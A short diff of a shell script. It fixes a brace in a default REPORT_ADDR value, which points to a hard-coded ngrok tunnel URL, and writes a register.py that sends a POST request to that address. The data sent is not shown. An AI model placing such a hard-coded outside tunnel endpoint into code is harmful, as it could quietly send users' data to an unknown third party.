@@ -1,6 +1,6 @@
 
 
-REPORT_ADDR="${REPORT_ADDR:-https://e0dd-2a00-102a-5013-df1e-ed60-5b47-ab22-47fb.ngrok-free.app"
+REPORT_ADDR="${REPORT_ADDR:-https://e0dd-2a00-102a-5013-df1e-ed60-5b47-ab22-47fb.ngrok-free.app}"
 cat << 'EOF' > register.py
 # Send POST request to REPORT_ADDR
 report_addr = os.environ["REPORT_ADDR"]
